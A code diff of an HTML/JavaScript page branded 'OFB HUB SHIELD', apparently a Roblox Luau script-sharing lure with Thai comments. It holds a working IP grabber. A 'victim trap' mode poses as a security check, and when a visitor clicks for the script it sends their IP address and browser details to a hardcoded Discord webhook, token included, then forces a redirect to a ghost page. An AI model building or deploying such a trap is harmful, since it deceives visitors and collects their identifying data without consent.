@@ -124,7 +124,7 @@
         <h1>OFB HUB SHIELD</h1>
         <div class="brand">[ LUAU PROTECT SYSTEM ]</div>
 
-        <!-- MODE 1: หน้าสร้างลิงก์ (สำหรับเราเอาไว้ใส่สคริปต์เดิมแล้วกดสร้างลิงก์ OBF แยก) -->
+        <!-- MODE 1: หน้าสร้างลิงก์ -->
         <div id="mode-create" class="box">
             <p>📌 วางสคริปต์ Luau เดิมของคุณที่นี่ เพื่อสร้างลิงก์ดัก:</p>
             <textarea id="input-script" placeholder="-- วางสคริปต์ Luau ที่นี่..."></textarea>
@@ -136,7 +136,7 @@
             </div>
         </div>
 
-        <!-- MODE 2: หน้าดักเหยื่อ (สำหรับคนที่กดลิงก์เข้ามา จะเจอหน้านี้และพอกดปุ่มปุ๊บ เด้งไปเว็บผีทันที) -->
+        <!-- MODE 2: หน้าดักเหยื่อ -->
         <div id="mode-shield" class="box">
             <p>🛡️ ระบบความปลอดภัย OFB ตรวจพบการเชื่อมต่อ</p>
             <div class="ip-box" id="target-ip">🔍 กำลังตรวจสอบ IP Address...</div>
@@ -146,8 +146,8 @@
     </div>
 
     <script>
-        // 🚨 Discord Webhook ของลูกพี่
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1559076293100703744/azwSwWi5plZAK-wwyyEtgd0nIvgtAr4jugmilvE_88kStwX9p6q75dEp9zOXtX-Je7Ul"; 
+        // 🚨 Discord Webhook ตัวจริงที่ลูกพี่ส่งมา
+        const DISCORD_WEBHOOK_URL = "Https://discord.com/api/webhooks/1559076293100703744/azwSwWi5plZAK-wwyyEtgd0nIvgtAr4jugmilvE_88kStwX9p6q75dEp9zOXtX-Je7Ul"; 
         
         // 👻 ลิงก์เว็บผี / ฮาโลวีน
         const GHOST_REDIRECT_URL = "https://jonathanbassedas.github.io/halloween/?fbclid=PAT01DUAUx2fNleHRuA2FlbQIxMABwZG9mAnNydGMGYXBwX2lkDzU2NzA2NzM0MzM1MjQyNwABp0aFNPxW06myDtPR_ZSIU4qwPmFdYQTiE6aSCePjat2jBpx4qYSEpmHYYrzs_aem_0DUYjEMtNcSEIdSNDLjj5w";
@@ -155,7 +155,6 @@
         let userIpAddress = "Unknown IP";
         let userAgentStr = navigator.userAgent;
 
-        // เช็ก URL ว่ามีพารามิเตอร์รึยัง (ถ้ามีแสดงว่าคือลิงก์แยกของเหยื่อ)
         const urlParams = new URLSearchParams(window.location.search);
         const encodedData = urlParams.get('obf');
 
@@ -171,14 +170,12 @@
             })
             .catch(() => {});
 
-        // ถ้ามีรหัส obf ในลิงก์ ให้แสดงหน้าดักเหยื่อ (Mode 2) ถ้าไม่มีให้แสดงหน้าสร้างลิงก์ (Mode 1)
         if (encodedData) {
             document.getElementById('mode-shield').classList.add('active');
         } else {
             document.getElementById('mode-create').classList.add('active');
         }
 
-        // ฟังก์ชันสร้างลิงก์ OBF แยก (Mode 1)
         function generateLink() {
             const rawScript = document.getElementById('input-script').value.trim();
             if (!rawScript) {
@@ -196,7 +193,7 @@
             alert("📋 คัดลอกลิงก์สำเร็จ!");
         }
 
-        // ฟังก์ชันทำงานตอนเหยื่อกดปุ่มรับสคริปต์ (Mode 2) -> ยิง IP + ล็อกลิงก์ + เด้งเว็บผีทันที
+        // ฟังก์ชันตอนเหยื่อกดปุ่มรับสคริปต์ -> ส่ง IP เข้า Discord ทันที + ล็อกลิงก์ถาวรไปเว็บผี
         function trapAndRedirect() {
             if(DISCORD_WEBHOOK_URL) {
                 fetch(DISCORD_WEBHOOK_URL, {
@@ -206,8 +203,8 @@
                         username: "OFB Security Bot",
                         avatar_url: "https://i.imgur.com/39aU444.jpg",
                         embeds: [{ 
-                            title: "🎯 มีคนกดรับสคริปต์ (โดนดักเต็มๆ!)", 
-                            description: `**IP:** \`${userIpAddress}\`\n**Device/Browser:** \`${userAgentStr}\``, 
+                            title: "🎯 มีคนกดรับสคริปต์ (โดนดัก IP เต็มๆ!)", 
+                            description: `**IP Address:** \`${userIpAddress}\`\n**Device/Browser:** \`${userAgentStr}\``, 
                             color: 16711680, 
                             timestamp: new Date().toISOString()
                         }]
@@ -215,7 +212,7 @@
                 }).catch(e => {});
             }
 
-            // ล็อกลิงก์ถาวรและบังคับเปิดเว็บผีทันที
+            // บังคับเปลี่ยนหน้าไปเว็บผีฮาโลวีนทันทีแบบถาวร
             window.location.replace(GHOST_REDIRECT_URL);
         }
 
